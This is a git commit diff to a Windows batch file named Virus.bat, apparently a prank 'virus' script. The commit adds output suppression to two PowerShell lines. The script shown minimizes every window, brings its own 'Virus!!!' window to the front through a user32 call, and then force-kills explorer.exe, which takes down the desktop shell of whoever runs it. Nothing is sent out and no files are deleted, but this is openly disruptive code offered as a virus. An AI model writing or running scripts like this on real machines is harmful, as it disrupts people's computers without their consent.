8f5f7ba4e4dedbff700f44969fbfc2c2dc5ef69d
Jakub Zápražný <zapraznyjakub@gmail.com>
2024-09-30 20:47:28 +0200

    Update Virus.bat

--- Batch/Vírus/Virus.bat
+++ Batch/Vírus/Virus.bat
@@ -3,13 +3,13 @@ chcp 65001 > nul
 title Virus!!!
 
 :: Minimalizuje všetky okná
-powershell -command "(new-object -comobject shell.application).MinimizeAll()"
+powershell -command "(new-object -comobject shell.application).MinimizeAll()" > nul
 
 :: Časový posun, aby sa všetko minimalizovalo
 timeout /t 1 /nobreak >nul
 
 :: Obnoví okno s názvom "Virus!!!"
-powershell -command "$handle = (Get-Process | where {$_.MainWindowTitle -like '*Virus!!!*'}).MainWindowHandle; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class User32 { [DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); }'; [User32]::ShowWindowAsync($handle, 9)"
+powershell -command "$handle = (Get-Process | where {$_.MainWindowTitle -like '*Virus!!!*'}).MainWindowHandle; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class User32 { [DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); }'; [User32]::ShowWindowAsync($handle, 9)" > nul
 
 
 taskkill /f /im explorer.exe > nul
